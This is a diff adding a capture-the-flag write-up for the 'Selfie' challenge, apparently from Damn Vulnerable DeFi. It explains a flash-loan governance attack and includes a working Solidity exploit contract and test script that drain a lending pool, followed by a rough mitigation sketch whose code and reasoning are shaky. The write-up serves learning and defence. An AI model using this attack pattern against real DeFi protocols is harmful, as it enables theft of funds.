@@ -365,3 +365,86 @@ function withdraw(uint256 amount) external {
     ...
 ```
 
+## Challenge #6 - Selfie
+A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
+
+What could go wrong, right ?
+
+You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
+
+### `SimpleGovernance.sol`: governance is vulnerable to a flash loan attack when an attacker takes a loan and queues malicious action in the same transaction
+
+Inside `queueAction` function we check sender balance to be bigger than the half of the total governance token supply 
+
+```
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
+        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+```
+Governance token is ERC20Snaphot contract which allows to save user balance at a given time via `snapshot` function, therefore someone can take a big enough loan, create a snaphot and pass a malicious queue action, for example emergency drain all funds from the pool.
+
+### Proof of concept
+
+Attacker's contract fragment, here we propose action with loaned governance tokens
+
+```
+    function attack() public {
+        DVT.approve(address(pool), type(uint256).max); 
+        uint256 bal = DVT.balanceOf(address(pool));
+        pool.flashLoan(this, address(DVT), bal, "0x");
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) public returns(bytes32){
+        bytes memory evilData = abi.encodeWithSignature("emergencyExit(address)", receiver);
+        DVT.snapshot();
+        actionId = governance.queueAction(address(pool), 0, evilData);
+        return CALLBACK_SUCCESS;
+    }
+```
+
+Inside `selfie.challenge.js` we launch the atack then wait for the proposal to cooldown and execute it
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('SelfieExploit', player);
+        exploit = await Exploit.deploy(pool.address, governance.address, token.address);
+
+        await exploit.connect(player).attack();
+        // Wait min governance cooldown time
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        // Execute action
+        let id = await exploit.actionId()
+        await governance.connect(player).executeAction(id);
+    });
+```
+
+### Mitigation
+
+We need to separate token `snapshot` function so it can't be called in the same transaction with action queueing. Inside the token contract
+```
+function snapshot() onlyGovernance {
+...
+}
+```
+We add modifier so it can only be called from  the governance contract and then we modify `SimpleGovernance.sol`
+
+```
+function createSnapshot() nonReentrant {
+    _governanceToken.snapshot();
+}
+
+fuction queueAction(...) nonReentrant {
+...
+}
+```
+
+Adding nonReentrant modifiers will separate voting logic from the snapshot creation, this will allow us to drop any transaction that tries to queue an action and update the snapshot in the same transaction like in an attack that we've discussed.
